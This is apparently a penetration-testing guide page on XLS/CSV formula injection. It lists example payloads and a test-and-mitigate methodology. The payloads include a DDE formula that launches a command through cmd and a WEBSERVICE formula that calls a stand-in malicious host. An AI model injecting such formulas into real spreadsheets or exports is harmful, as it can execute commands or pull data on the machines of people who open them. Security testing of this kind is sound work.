---
description: >-
  XLS/CSV Injection, also known as Formula Injection or CSV Injection, occurs
  when a malicious user inputs data into an application that is later exported
  to an XLS or CSV file.
---

# XLS/CSV Injection

## Example Tests for XLS/CSV Injection

When performing a penetration test, you can use various payloads to test for XLS/CSV injection vulnerabilities. Below are some example commands and payloads that can be used to test if an application is vulnerable to XLS/CSV injection.

### **Example Payloads for CSV Injection**

1.  **Basic Hyperlink Injection**

    ```plaintext
    =HYPERLINK("https://www.example.com","CLICK ME")
    ```
2.  **Potentially Dangerous Formula**

    ```plaintext
    =cmd|' /C calc'!A0
    ```
3.  **External Data Fetch**

    ```plaintext
    =WEBSERVICE("http://malicious-site.com/data")
    ```

## Testing Methodology

1. **Injecting Payloads**:
   * Identify fields in the application where you can input data that will be exported to XLS or CSV files.
   * Input the example payloads into these fields.
2. **Export and Analysis**:
   * Export the data to an XLS or CSV file from the application.
   * Open the exported file with a text editor to verify that the payloads are correctly injected.
   * Open the file with a spreadsheet program (e.g., Microsoft Excel) to see if the payloads execute as formulas.
3. **Observation and Mitigation**:
   * Observe the behaviour of the application and the spreadsheet program to detect any execution of malicious payloads.
   * Recommend encoding or sanitising the input data to prevent such injections.
